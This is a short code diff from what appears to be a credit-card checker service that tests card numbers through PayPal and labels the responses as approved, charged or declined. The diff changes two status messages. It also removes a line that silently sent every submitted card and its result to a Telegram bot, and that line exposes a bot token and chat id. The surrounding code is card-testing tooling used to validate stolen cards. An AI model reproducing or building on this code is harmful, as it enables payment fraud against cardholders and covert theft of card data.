@@ -396,11 +396,11 @@ def paypal(ccx):
     elif 'is3DSecureRequired' in last or 'OTP' in last:
     	msg="OTP ❎"
     elif 'INVALID_SECURITY_CODE' in last:
-    	msg="CVV ❎"
+    	msg="INVALID SECURITY CODE ❎"
     elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
     	msg="APPROVED ✅"
     elif 'INVALID_BILLING_ADDRESS' in last:
-    	msg="Charge ✅"
+    	msg="'INVALID BILLING ADDRESS' ✅"
     elif 'CARD_GENERIC_ERROR' in last:
     	msg="CARD_GENERIC_ERROR ❌"
     else:
@@ -412,7 +412,6 @@ def calc():
     try:
         a = request.args.get("cc")
         result=paypal(a)
-        requests.get(f'https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage?chat_id=6689099522&text={a}|{result}')
         return jsonify({
            'card': a,
            'amount': '1$',
